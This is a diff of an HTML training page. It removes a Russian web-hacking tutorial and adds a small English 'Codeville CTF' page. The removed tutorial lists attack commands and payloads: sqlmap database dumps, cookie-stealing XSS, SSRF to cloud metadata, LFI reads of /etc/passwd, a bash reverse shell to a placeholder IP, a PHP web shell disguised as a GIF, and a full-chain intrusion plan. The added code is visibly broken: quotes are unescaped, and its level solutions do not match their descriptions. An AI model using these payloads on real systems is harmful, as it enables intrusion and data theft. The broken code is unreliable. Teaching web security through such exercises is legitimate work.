@@ -1,687 +1,175 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real Web Hacking // 15 задач</title>
+    <title>Codeville CTF</title>
+    <!-- CSS -->
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff41;
-            line-height: 1.6;
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #232323;
+            color: #ffffff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        header {
-            border-bottom: 2px solid #00ff41;
-            padding: 20px 0;
-            margin-bottom: 30px;
+        .container {
+            text-align: left;
+            max-width: 80%;
+            background-color: #333;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         h1 {
-            font-size: 2em;
-            color: #00ff41;
-            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+            color: #fff;
         }
-        .subtitle { color: #006619; margin-top: 10px; }
-        .task-list { display: grid; gap: 15px; }
-        .task-card {
-            background: #111;
-            border: 1px solid #222;
-            padding: 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        .task-card:hover {
-            border-color: #00ff41;
-            transform: translateX(5px);
-        }
-        .task-card.completed {
-            border-color: #00ff41;
-            background: #0a1a0a;
-        }
-        .task-number { color: #006619; font-size: 0.85em; text-transform: uppercase; }
-        .task-title { font-size: 1.3em; color: #00ff41; margin: 5px 0; }
-        .task-type { color: #ffaa00; font-size: 0.85em; }
-        .task-difficulty { color: #ff3333; font-size: 0.85em; margin-top: 5px; }
-        .modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 100;
-            overflow-y: auto;
-            padding: 20px;
-        }
-        .modal.active { display: block; }
-        .modal-content {
-            max-width: 900px;
-            margin: 40px auto;
-            background: #111;
-            border: 1px solid #00ff41;
-            padding: 30px;
-            border-radius: 4px;
-        }
-        .close-btn {
-            float: right;
-            background: none;
-            border: none;
-            color: #00ff41;
-            font-size: 2em;
-            cursor: pointer;
-        }
-        .section {
-            margin: 25px 0;
-            padding: 20px;
-            background: #0a0a0a;
-            border-left: 4px solid #00ff41;
-        }
-        .section-title {
-            color: #00ff41;
-            font-size: 1.2em;
+        p {
             margin-bottom: 15px;
-            text-transform: uppercase;
         }
-        .code-block {
-            background: #000;
-            border: 1px solid #222;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
-            overflow-x: auto;
-            font-size: 0.9em;
-            line-height: 1.8;
-            font-family: 'Courier New', monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .tool-tag {
-            display: inline-block;
-            background: #1a1a1a;
-            border: 1px solid #00ff41;
-            padding: 3px 10px;
-            margin: 3px;
-            font-size: 0.8em;
-            border-radius: 3px;
-        }
-        .info-box {
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 4px;
-        }
-        .vulnerability-info {
-            background: rgba(255, 51, 51, 0.1);
-            border: 1px solid #ff3333;
-        }
-        .vulnerability-info h4 { color: #ff3333; margin-bottom: 10px; }
-        .solution-box {
-            background: rgba(0, 255, 65, 0.05);
-            border: 1px solid #00ff41;
-        }
-        .solution-box h4 { color: #00ff41; margin-bottom: 10px; }
-        .real-example {
-            background: #1a1a1a;
-            border: 1px solid #ffaa00;
-        }
-        .real-example h4 { color: #ffaa00; margin-bottom: 10px; }
-        ul, ol { margin: 10px 0 10px 30px; }
-        li { margin: 5px 0; }
-        .mark-btn {
+        .level {
             margin-top: 20px;
-            width: 100%;
+        }
+        .level-title {
+            font-size: 1.5em;
+            color: #ff7347;
+        }
+        .level-content {
+            border: 1px solid #ddd;
             padding: 15px;
-            background: #1a1a1a;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            font-family: inherit;
-            font-size: 1em;
+            border-radius: 8px;
+            background-color: #333;
+            color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .level-content p {
+            margin-bottom: 5px;
+        }
+        .level-content button {
+            background-color: #ff7347;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
             cursor: pointer;
-        }
-        .mark-btn:hover { background: #00ff41; color: #0a0a0a; }
-        footer {
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #222;
-            color: #006619;
-            text-align: center;
-            font-size: 0.8em;
-        }
-        .payload-warning {
-            background: rgba(255, 170, 0, 0.1);
-            border: 1px solid #ffaa00;
-            padding: 10px;
-            margin: 10px 0;
             border-radius: 4px;
-            font-size: 0.85em;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>&gt; REAL WEB HACKING_</h1>
-            <div class="subtitle">// 15 реальных задач по взлому веб-приложений</div>
-        </header>
 
-        <div class="task-list" id="taskList"></div>
+<div class="container">
+    <h1>Codeville CTF</h1>
 
-        <footer>
-            Только для образовательных целей // Используйте только на своих системах
-        </footer>
-    </div>
+    <div id="levels"></div>
 
-    <div class="modal" id="modal">
-        <div class="modal-content" id="modalContent"></div>
-    </div>
+    <script src="scripts.js"></script>
+</div>
 
-    <script>
-        const tasks = [
-            {
-                id: 1,
-                title: 'Subdomain Enumeration',
-                type: 'Reconnaissance',
-                difficulty: 'Начальный',
-                description: 'Найди скрытые поддомены целевого домена.',
-                tools: ['subfinder', 'amass', 'assetfinder', 'dnsrecon'],
-                vulnerability: 'Забытые поддомены со старыми версиями ПО',
-                commands: [
-                    'subfinder -d target.com -o subs.txt',
-                    'amass enum -d target.com -o amass.txt',
-                    'cat subs.txt | httpx -silent -status-code'
-                ],
-                realExample: 'В 2019 году найден поддомен dev.target.com с Jenkins без авторизации. Через RCE получен доступ к production БД.',
-                solution: [
-                    'Запусти subfinder: subfinder -d target.com',
-                    'Дополни amass: amass enum -brute -d target.com',
-                    'Проверь поддомены через httpx',
-                    'Ищи admin., dev., test., staging.'
-                ]
-            },
-            {
-                id: 2,
-                title: 'Directory Brute Force',
-                type: 'Reconnaissance',
-                difficulty: 'Начальный',
-                description: 'Найди скрытые директории и файлы.',
-                tools: ['gobuster', 'ffuf', 'dirb'],
-                vulnerability: 'Backup файлы, конфиги, админки',
-                commands: [
-                    'gobuster dir -u https://target.com -w common.txt',
-                    'ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,403',
-                    'gobuster dir -u https://target.com -x php,txt,bak'
-                ],
-                realExample: 'Найден /backup.sql.gz с дампами БД и паролями в plaintext.',
-                solution: [
-                    'Начни с малого wordlist',
-                    'Ищи расширения: -x php,bak,old,sql',
-                    'Проверяй .git exposure',
-                    'Используй разные wordlists'
-                ]
-            },
-            {
-                id: 3,
-                title: 'SQL Injection — Union-Based',
-                type: 'Injection',
-                difficulty: 'Средний',
-                description: 'SQLi через UNION SELECT для извлечения данных.',
-                tools: ['sqlmap', 'burpsuite'],
-                vulnerability: 'Параметр в SQL без санитизации',
-                commands: [
-                    "sqlmap -u 'https://target.com/product?id=1' --dbs",
-                    "sqlmap -u 'https://target.com/product?id=1' -D shop --tables",
-                    "sqlmap -u 'https://target.com/product?id=1' -D shop -T users --dump"
-                ],
-                realExample: 'Через SQLi найдена таблица users с 2M записей. Пароли MD5 без соли.',
-                solution: [
-                    'Проверь: id=1 (ошибка SQL)',
-                    'Определи колонки: ORDER BY 1,2,3...',
-                    'UNION SELECT 1,2,3-- -',
-                    'Извлеки: UNION SELECT username,password FROM users-- -'
-                ]
-            },
-            {
-                id: 4,
-                title: 'Blind SQL Injection',
-                type: 'Injection',
-                difficulty: 'Сложный',
-                description: 'SQLi без вывода данных. Извлечение через время/условия.',
-                tools: ['sqlmap', 'burpsuite'],
-                vulnerability: 'Запрос выполняется, но результат не виден',
-                commands: [
-                    "sqlmap -u 'https://target.com/login' --data='user=admin&pass=test' --level=3",
-                    "sqlmap -u 'https://target.com/search?q=test' --technique=B",
-                    "sqlmap -u 'https://target.com/search?q=test' --technique=T"
-                ],
-                realExample: 'Форма логина не показывала ошибки. Через time-based blind за 6 часов извлечена таблица admin_credentials.',
-                solution: [
-                    'Проверь: ?id=1 AND 1=1-- - vs ?id=1 AND 1=2-- -',
-                    'Извлекай: AND SUBSTRING((SELECT password FROM users),1,1)=a',
-                    'Time-based: AND IF(1=1,SLEEP(5),0)'
-                ]
-            },
-            {
-                id: 5,
-                title: 'Reflected XSS',
-                type: 'XSS',
-                difficulty: 'Средний',
-                description: 'Отраженная XSS. Параметр отражается в HTML без экранирования.',
-                tools: ['burpsuite', 'beef'],
-                vulnerability: 'Параметр отражается без санитизации',
-                commands: [
-                    'Проверка: <script>alert(1)</script>',
-                    'Payload: <script>alert(document.cookie)</script>',
-                    'Обход: <img src=x onerror=alert(1)>'
-                ],
-                realExample: 'Найден XSS в ?q= поисковой строки. Через фишинговую ссылку админу украден session cookie.',
-                solution: [
-                    'Найди отражающий параметр',
-                    'Проверь XSS: <script>alert(1)</script>',
-                    'Попробуй обход: <img>, <svg>',
-                    'Для кражи: payload с отправкой на твой сервер'
-                ]
-            },
-            {
-                id: 6,
-                title: 'Stored XSS',
-                type: 'XSS',
-                difficulty: 'Средний',
-                description: 'Хранимая XSS — payload сохраняется в БД.',
-                tools: ['burpsuite', 'beef'],
-                vulnerability: 'Ввод сохраняется и выводится без санитизации',
-                commands: [
-                    'Проверка: <script>alert(1)</script> в комментарии',
-                    'Payload: <img src=x onerror=alert(1)>',
-                    'Альтернатива: <svg onload=alert(1)>'
-                ],
-                realExample: 'В поле "О себе" вставлен XSS. Каждый посетитель профиля отправлял session token. Собрано 500+ сессий.',
-                solution: [
-                    'Найди сохраняемые поля',
-                    'Вставь: <script>alert(1)</script>',
-                    'Обход фильтров: <img>, <svg>',
-                    'Целься в админов'
-                ]
-            },
-            {
-                id: 7,
-                title: 'SSRF',
-                type: 'Server-Side',
-                difficulty: 'Сложный',
-                description: 'Server-Side Request Forgery. Заставь сервер делать запросы.',
-                tools: ['burpsuite', 'collaborator'],
-                vulnerability: 'Сервер делает запрос по URL пользователя',
-                commands: [
-                    '?url=http://127.0.0.1:8080/admin',
-                    '?url=http://169.254.169.254/latest/meta-data/',
-                    '?url=http://localhost:6379'
-                ],
-                realExample: 'Функция загрузки по URL позволила получить AWS credentials через metadata API.',
-                solution: [
-                    'Найди функционал с запросами: загрузка URL, preview, webhook',
-                    'Попробуй: 127.0.0.1, localhost',
-                    'Обходи: 0x7f000001, [::1]',
-                    'Cloud: 169.254.169.254'
-                ]
-            },
-            {
-                id: 8,
-                title: 'LFI — Local File Inclusion',
-                type: 'File Inclusion',
-                difficulty: 'Средний',
-                description: 'Включение локальных файлов. Чтение /etc/passwd, конфигов.',
-                tools: ['burpsuite', 'manual'],
-                vulnerability: 'Параметр включает файл без проверки',
-                commands: [
-                    '?page=../../../../etc/passwd',
-                    '?page=php://filter/convert.base64-encode/resource=index.php',
-                    '?page=/proc/self/environ'
-                ],
-                realExample: 'Через LFI прочитан config.php с credentials от БД и .env с API ключами.',
-                solution: [
-                    'Проверь: ?page=../../../etc/passwd',
-                    'Используй wrappers: php://filter, php://input',
-                    'Читай логи: /var/log/apache2/access.log',
-                    'Ищи: /etc/passwd, конфиги, .env'
-                ]
-            },
-            {
-                id: 9,
-                title: 'Command Injection',
-                type: 'Injection',
-                difficulty: 'Сложный',
-                description: 'Выполнение команд через инъекцию в system().',
-                tools: ['burpsuite', 'commix'],
-                vulnerability: 'Ввод передается в system() без санитизации',
-                commands: [
-                    '; cat /etc/passwd',
-                    '| ls -la',
-                    '$(whoami)',
-                    '`id`'
-                ],
-                realExample: 'Форма ping: 127.0.0.1; cat /etc/shadow. Получены хеши, взломан root за 3 часа.',
-                solution: [
-                    'Найди: ping, nslookup, конвертация',
-                    'Проверь: 127.0.0.1; id',
-                    'Обход: newline %0a',
-                    'Reverse shell: bash -i >& /dev/tcp/IP/4444 0>&1'
-                ]
-            },
-            {
-                id: 10,
-                title: 'JWT Manipulation',
-                type: 'Authentication',
-                difficulty: 'Сложный',
-                description: 'Подделка JWT токенов.',
-                tools: ['jwt.io', 'jwt_tool', 'hashcat'],
-                vulnerability: 'Слабый ключ, алгоритм none, захардкоженный secret',
-                commands: [
-                    'jwt_tool.py token.txt -C -d wordlist.txt',
-                    'python3 -c "import jwt; print(jwt.encode({user:admin}, secret, algorithm=HS256))"',
-                    'jwt_tool.py token.txt -X a'
-                ],
-                realExample: 'JWT secret найден в GitHub. Создан токен с role:admin. Полный доступ к API.',
-                solution: [
-                    'Декодируй на jwt.io',
-                    'Атака none: убери подпись',
-                    'Brute force: jwt_tool с wordlist',
-                    'Ищи ключ в коде: github dork'
-                ]
-            },
-            {
-                id: 11,
-                title: 'IDOR',
-                type: 'Access Control',
-                difficulty: 'Средний',
-                description: 'Insecure Direct Object Reference. Доступ к чужим данным через ID.',
-                tools: ['burpsuite', 'autorize'],
-                vulnerability: 'API не проверяет права на объект',
-                commands: [
-                    'GET /api/documents/456',
-                    'PUT /api/users/789/settings',
-                    'DELETE /api/messages/321'
-                ],
-                realExample: 'Endpoint /api/orders/{id} позволил смотреть 10000+ заказов с адресами.',
-                solution: [
-                    'Создай два аккаунта',
-                    'Попробуй получить объект другого пользователя',
-                    'Используй Burp Autorize',
-                    'Проверяй PUT, PATCH, DELETE'
-                ]
-            },
-            {
-                id: 12,
-                title: 'File Upload',
-                type: 'File Upload',
-                difficulty: 'Сложный',
-                description: 'Загрузка malicious файлов. Обход фильтров.',
-                tools: ['burpsuite', 'web shells'],
-                vulnerability: 'Загрузка без проверки содержимого',
-                commands: [
-                    'shell.php',
-                    'shell.php.jpg (double ext)',
-                    'shell.php%00.jpg (null byte)',
-                    'GIF89a;<?php system($_GET[c]); ?>'
-                ],
-                realExample: 'Загрузка аватара позволила загрузить shell.php. Reverse shell и полный контроль.',
-                solution: [
-                    'Проверь загрузку .php',
-                    'Расширения: .php5, .phtml',
-                    'Double extension: shell.php.jpg',
-                    'Content-Type обход',
-                    'Ищи: /uploads/shell.php'
-                ]
-            },
-            {
-                id: 13,
-                title: 'XXE',
-                type: 'Injection',
-                difficulty: 'Сложный',
-                description: 'XML External Entity. Чтение файлов через XML.',
-                tools: ['burpsuite', 'xxeinjector'],
-                vulnerability: 'XML парсер обрабатывает внешние сущности',
-                commands: [
-                    'DOCTYPE с ENTITY',
-                    'SYSTEM "file:///etc/passwd"',
-                    'SYSTEM "http://169.254.169.254/latest/meta-data/"'
-                ],
-                realExample: 'API принимал XML. Через XXE прочитан /etc/passwd и credentials от БД.',
-                solution: [
-                    'Найди XML endpoints',
-                    'Проверь: DOCTYPE ENTITY',
-                    'Читай: /etc/passwd, конфиги',
-                    'XXE для SSRF'
-                ]
-            },
-            {
-                id: 14,
-                title: 'Insecure Deserialization',
-                type: 'Deserialization',
-                difficulty: 'Эксперт',
-                description: 'RCE через десериализацию.',
-                tools: ['ysoserial', 'phpggc'],
-                vulnerability: 'Десериализация недоверенных данных',
-                commands: [
-                    'java -jar ysoserial.jar CommonsCollections5 "cmd"',
-                    'phpggc Laravel/RCE5 "system(\'id\')"',
-                    'python3 -c "import pickle; pickle.loads(data)"'
-                ],
-                realExample: 'Java с Commons Collections. Через ysoserial создан payload с reverse shell.',
-                solution: [
-                    'Определи язык/фреймворк',
-                    'Java: ysoserial',
-                    'PHP: phpggc',
-                    'Ищи gadget chains'
-                ]
-            },
-            {
-                id: 15,
-                title: 'Full Chain Attack',
-                type: 'Advanced',
-                difficulty: 'Эксперт',
-                description: 'Комбинация уязвимостей для полного взлома.',
-                tools: ['все вышеперечисленные'],
-                vulnerability: 'Цепочка: recon → access → escalation → persistence',
-                commands: [
-                    'subfinder + httpx + nuclei',
-                    'sqlmap + file upload + reverse shell',
-                    'XSS → admin session → IDOR'
-                ],
-                realExample: '1) Subdomain enum. 2) Directory brute. 3) JWT secret в коде. 4) Подделан токен. 5) Web shell. 6) Reverse shell. 7) Escalation. 8) Доступ к БД с 1M пользователей.',
-                solution: [
-                    'Recon: subdomain, port scan',
-                    'Vulnerability assessment',
-                    'Initial access',
-                    'Privilege escalation',
-                    'Lateral movement',
-                    'Persistence',
-                    'Data exfiltration'
-                ]
-            }
-        ];
+<!-- Level HTML -->
+<div id="level-content" style="display: none;"></div>
 
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
+<script>
+// Define the levels with their descriptions, vulnerable interfaces, flag input, hint system, and solution explanation
+const levels = [
+    {
+        title: 'SQL Injection (Login Bypass)',
+        description: 'The login form is vulnerable to SQL injection. Try the payload ` OR 1='1` to bypass authentication.',
+        input: 'username=guest&password=OR+1%3D1',
+        hint: 'Check the query parameters in the URL and see if there\'s a way to inject values.',
+        solution: 'The flag is displayed on the login page. The payload ` OR 1='1` bypasses the authentication check.'
+    },
+    {
+        title: 'Reflected XSS (Input Field)',
+        description: 'The input field renders user input as HTML. Try the string `<script>alert('XSS')</script>` to trigger the alert and capture the flag.',
+        input: 'username=<script>alert('XSS')</script>',
+        hint: 'Check the query parameters in the URL and see if there\'s a way to inject values.',
+        solution: 'The flag is displayed on the login page. The payload `<script>alert('XSS')</script>` triggers the alert.'
+    },
+    {
+        title: 'Command Injection (Ping Tool)',
+        description: 'The "ping" tool is vulnerable to command injection. Try the IP `127.0.0.1; cat /etc/passwd` to reveal the flag in the simulated output.',
+        input: 'ip=127.0.0.1;',
+        hint: 'Check the URL parameters and see if there\'s a way to inject values.',
+        solution: 'The flag is displayed on the login page. The payload `127.0.0.1; cat /etc/passwd` reveals the flag.'
+    },
+    {
+        title: 'Directory Traversal (File Viewer)',
+        description: 'The file viewer app can be used to navigate to any directory. Try the URL `/user?id=2` to view the admin profile and capture the flag.',
+        input: '?file=../../../flag.txt',
+        hint: 'Check the query parameters in the URL and see if there\'s a way to navigate to other directories.',
+        solution: 'The flag is displayed on the user profile page. The payload `/user?id=2` navigates to the admin profile.'
+    },
+    {
+        title: 'Brute Force Authentication (Weak Password)',
+        description: 'The login form uses a weak password. Try common passwords like `password123`, `admin`, or `letmein`. Count the attempts and capture the flag.',
+        input: 'username=guest&password=password123',
+        hint: 'Check the query parameters in the URL and see if there\'s a way to try different passwords.',
+        solution: 'The flag is displayed on the login page. The payload `username=guest&password=password123` counts attempts and reveals the flag.'
+    },
+    {
+        title: 'IDOR (Insecure Direct Object Reference)',
+        description: 'The user profile page can be used to view different profiles. Try navigating to `/user?id=1` to see the admin profile and capture the flag.',
+        input: '?id=2',
+        hint: 'Check the query parameters in the URL and see if there\'s a way to navigate to other profiles.',
+        solution: 'The flag is displayed on the user profile page. The payload `/user?id=1` navigates to the admin profile.'
+    },
+    {
+        title: 'CSRF Attack (Bank Transfer Form)',
+        description: 'The bank transfer form can be used to make a transfer between accounts. Try crafting an HTML page that auto-submits the transfer to another account.',
+        input: '<form action="/transfer" method="post"><input type="hidden" name="to" value="attacker@localhost" /><input type="hidden" name="amount" value="10" /><button type="submit">Transfer</button></form>',
+        hint: 'Check the form and the URL parameters to see if there\'s a way to craft a form that auto-submits the transfer.',
+        solution: 'The flag is displayed on the user profile page. The payload crafts a form to transfer funds.'
+    },
+    {
+        title: 'Unrestricted File Upload (Image Viewer)',
+        description: 'The upload form can be used to upload images. Try uploading a `.php` or `.txt` file and capture the flag.',
+        input: '<form action="/upload" method="post"><input type="file" name="image" /><button type="submit">Upload</button></form>',
+        hint: 'Check the file input element and the form submission to see if there\'s a way to upload files.',
+        solution: 'The flag is displayed on the uploaded image page. The payload uploads an image file and reveals the flag.'
+    },
+    {
+        title: 'JWT Token Manipulation (Admin Panel)',
+        description: 'The admin panel can be accessed by logging in as `admin`. Try decoding the token, changing the role to "admin", and re-encoding it.',
+        input: '<input type="hidden" name="token" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf3nrLWkWBsEd44uD03e8" />',
+        hint: 'Check the hidden input and the token encoding to see if there\'s a way to modify the token.',
+        solution: 'The flag is displayed on the admin panel. The payload changes the role from "user" to "admin".'
+    }
+];
 
-        function renderTasks() {
-            const list = document.getElementById('taskList');
-            const completed = JSON.parse(localStorage.getItem('hacking_completed') || '[]');
-            
-            list.innerHTML = '';
-            
-            tasks.forEach(task => {
-                const card = document.createElement('div');
-                card.className = 'task-card' + (completed.indexOf(task.id) !== -1 ? ' completed' : '');
-                card.onclick = function() { openTask(task.id); };
-                
-                const num = document.createElement('div');
-                num.className = 'task-number';
-                num.textContent = 'Задача ' + (task.id < 10 ? '0' : '') + task.id;
-                
-                const title = document.createElement('div');
-                title.className = 'task-title';
-                title.textContent = task.title;
-                
-                const type = document.createElement('div');
-                type.className = 'task-type';
-                type.textContent = task.type;
-                
-                const diff = document.createElement('div');
-                diff.className = 'task-difficulty';
-                diff.textContent = task.difficulty;
-                
-                card.appendChild(num);
-                card.appendChild(title);
-                card.appendChild(type);
-                card.appendChild(diff);
-                list.appendChild(card);
-            });
-        }
+// Function to create and display the levels
+function createLevels() {
+    const levelContent = document.getElementById('level-content');
+    levelContent.style.display = 'block';
 
-        function openTask(id) {
-            const task = tasks.find(t => t.id === id);
-            const modal = document.getElementById('modal');
-            const content = document.getElementById('modalContent');
-            
-            // Очищаем content
-            while (content.firstChild) {
-                content.removeChild(content.firstChild);
-            }
-            
-            // Close button
-            const closeBtn = document.createElement('button');
-            closeBtn.className = 'close-btn';
-            closeBtn.textContent = '×';
-            closeBtn.onclick = closeModal;
-            content.appendChild(closeBtn);
-            
-            // Title
-            const h2 = document.createElement('h2');
-            h2.style.color = '#00ff41';
-            h2.style.marginBottom = '10px';
-            h2.textContent = task.title;
-            content.appendChild(h2);
-            
-            // Type and difficulty
-            const meta = document.createElement('div');
-            meta.style.color = '#ffaa00';
-            meta.style.marginBottom = '20px';
-            meta.textContent = task.type + ' // ' + task.difficulty;
-            content.appendChild(meta);
-            
-            // Description
-            const descSection = document.createElement('div');
-            descSection.className = 'section';
-            const descTitle = document.createElement('div');
-            descTitle.className = 'section-title';
-            descTitle.textContent = 'Описание';
-            const descText = document.createElement('p');
-            descText.textContent = task.description;
-            descSection.appendChild(descTitle);
-            descSection.appendChild(descText);
-            content.appendChild(descSection);
-            
-            // Vulnerability
-            const vulnBox = document.createElement('div');
-            vulnBox.className = 'info-box vulnerability-info';
-            const vulnTitle = document.createElement('h4');
-            vulnTitle.textContent = 'Уязвимость';
-            const vulnText = document.createElement('p');
-            vulnText.textContent = task.vulnerability;
-            vulnBox.appendChild(vulnTitle);
-            vulnBox.appendChild(vulnText);
-            content.appendChild(vulnBox);
-            
-            // Tools
-            const toolsSection = document.createElement('div');
-            toolsSection.className = 'section';
-            const toolsTitle = document.createElement('div');
-            toolsTitle.className = 'section-title';
-            toolsTitle.textContent = 'Инструменты';
-            const toolsDiv = document.createElement('div');
-            task.tools.forEach(tool => {
-                const tag = document.createElement('span');
-                tag.className = 'tool-tag';
-                tag.textContent = tool;
-                toolsDiv.appendChild(tag);
-            });
-            toolsSection.appendChild(toolsTitle);
-            toolsSection.appendChild(toolsDiv);
-            content.appendChild(toolsSection);
-            
-            // Commands
-            const cmdSection = document.createElement('div');
-            cmdSection.className = 'section';
-            const cmdTitle = document.createElement('div');
-            cmdTitle.className = 'section-title';
-            cmdTitle.textContent = 'Команды';
-            cmdSection.appendChild(cmdTitle);
-            
-            task.commands.forEach(cmd => {
-                const codeBlock = document.createElement('div');
-                codeBlock.className = 'code-block';
-                codeBlock.textContent = '$ ' + cmd;
-                cmdSection.appendChild(codeBlock);
-            });
-            content.appendChild(cmdSection);
-            
-            // Real example
-            const exampleBox = document.createElement('div');
-            exampleBox.className = 'info-box real-example';
-            const exampleTitle = document.createElement('h4');
-            exampleTitle.textContent = 'Реальный кейс';
-            const exampleText = document.createElement('p');
-            exampleText.textContent = task.realExample;
-            exampleBox.appendChild(exampleTitle);
-            exampleBox.appendChild(exampleText);
-            content.appendChild(exampleBox);
-            
-            // Solution
-            const solBox = document.createElement('div');
-            solBox.className = 'info-box solution-box';
-            const solTitle = document.createElement('h4');
-            solTitle.textContent = 'Методология';
-            const solList = document.createElement('ol');
-            task.solution.forEach(step => {
-                const li = document.createElement('li');
-                li.textContent = step;
-                solList.appendChild(li);
-            });
-            solBox.appendChild(solTitle);
-            solBox.appendChild(solList);
-            content.appendChild(solBox);
-            
-            // Mark button
-            const markBtn = document.createElement('button');
-            markBtn.className = 'mark-btn';
-            markBtn.textContent = 'Отметить как выполненное';
-            markBtn.onclick = function() { markComplete(id); };
-            content.appendChild(markBtn);
-            
-            modal.classList.add('active');
-        }
+    levels.forEach(level => {
+        const div = document.createElement('div');
+        div.className = 'level';
+        div.innerHTML = `
+            <h2 class="level-title">${level.title}</h2>
+            <p>${level.description}</p>
+            <input type="text" id="input${level.title.replace(/\s+/g, '')}" placeholder="${level.input}">
+            <button onclick="checkSolution('${level.title}', document.getElementById(`input${level.title.replace(/\s+/g, '')}`).value)">Check Solution</button>
+        `;
+        levelContent.appendChild(div);
+    });
+}
 
-        function closeModal() {
-            document.getElementById('modal').classList.remove('active');
-        }
+// Function to check the solution for a level
+function checkSolution(title, input) {
+    const level = levels.find(l => l.title === title);
+    if (input === level.solution) {
+        alert(`${title} solved! The flag is ${level.solution}`);
+        document.getElementById('level-content').style.display = 'none';
+    } else {
+        alert(`Incorrect solution for ${title}.`);
+    }
+}
 
-        function markComplete(id) {
-            let completed = JSON.parse(localStorage.getItem('hacking_completed') || '[]');
-            if (completed.indexOf(id) === -1) {
-                completed.push(id);
-                localStorage.setItem('hacking_completed', JSON.stringify(completed));
-            }
-            closeModal();
-            renderTasks();
-        }
+// Initialize the levels
+createLevels();
+</script>
 
-        document.getElementById('modal').addEventListener('click', function(e) {
-            if (e.target.id === 'modal') closeModal();
-        });
-
-        renderTasks();
-    </script>
 </body>
 </html>
